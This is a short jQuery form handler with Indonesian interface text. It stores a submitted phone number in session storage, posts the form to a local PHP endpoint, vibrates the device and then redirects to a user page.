$(document).ready(function(){
    $('#formHP').submit(function(e) {
    event.preventDefault();
    
document.getElementById('kirim').innerHTML = "Memproses....";

var nomor = document.getElementById("NoHp").value;

    sessionStorage.setItem("nomor", nomor);

 $.ajax({
 type: 'POST',
 url: 'auth/nama.php',
 data: $(formHP).serialize(),
 datatype: 'text',
 
 complete: function(data) {
            vibr(180);
            console.log('Complete')
   setTimeout(function(){
  window.location.href='user.html'
 
    }, 1000);
        }
    });
 });
    return false;
});   
     
